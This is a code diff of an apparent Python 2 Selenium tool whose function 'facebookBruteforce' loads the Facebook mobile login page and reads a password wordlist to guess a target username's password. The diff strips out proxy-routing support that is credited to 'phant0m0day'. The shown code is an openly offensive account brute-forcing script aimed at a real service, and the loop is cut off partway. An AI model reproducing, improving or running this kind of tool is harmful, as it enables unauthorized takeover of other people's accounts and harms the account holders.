@@ -1,9 +1,7 @@
 # -*- coding: utf-8 -*-
-# Proxy connections added by phant0m0day
 from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.proxy import *
 import sys
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -26,19 +24,8 @@ def facebookCheck(username):
         return 1
 
 
-def facebookBruteforce(username, wordlist, delay, https_proxy):
-    if https_proxy == False:
-        driver = webdriver.Firefox()
-    else:
-        proxy1 = https_proxy
-        proxy = Proxy({
-            'proxyType': ProxyType.MANUAL,
-            'httpProxy': proxy1,
-            'ftpProxy': '',
-            'sslProxy': proxy1,
-            'noProxy': '',
-        })
-        driver = webdriver.Firefox(proxy=proxy)
+def facebookBruteforce(username, wordlist, delay):
+    driver = webdriver.Firefox()
     driver.get("https://mbasic.facebook.com/login")
     wordlist = open(wordlist, 'r')
     for i in wordlist.readlines():
